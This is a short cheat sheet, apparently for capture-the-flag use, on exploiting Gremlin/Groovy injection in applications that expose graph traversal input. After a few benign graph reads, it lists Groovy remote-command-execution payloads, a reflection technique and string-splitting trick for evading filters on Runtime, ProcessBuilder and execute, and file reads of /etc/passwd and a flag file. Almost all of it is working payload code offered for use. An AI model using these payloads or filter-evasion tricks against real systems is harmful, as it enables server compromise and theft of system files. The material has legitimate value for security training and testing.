# Graph Query

## Gremlin

When the app exposes Gremlin/Groovy traversal input, start with normal graph reads.

```groovy
g.V().limit(5).toList()
g.V().valueMap(true).toList()
g.V().hasLabel('service').valueMap('name','tier').toList()
g.E().valueMap(true).toList()
```

## Gremlin Groovy RCE

```groovy
"id".execute().text
"cat /flag*".execute().text
["bash","-c","id"].execute().text
```

## Reflection Bypass

Use when direct `Runtime`, `ProcessBuilder`, or `execute` strings are blocked.

```groovy
def c = Class.forName("java.lang.ProcessBuilder")
def ctor = c.getConstructor(java.util.List.class)
def pb = ctor.newInstance(["bash","-c","id"])
pb.start().getInputStream().text
```

If method names are filtered, split strings:

```groovy
def n = "for" + "Name"
def c = Class."$n"("java.lang.ProcessBuilder")
```

## File Read

```groovy
new File("/etc/passwd").text
new File("/flag.txt").text
```
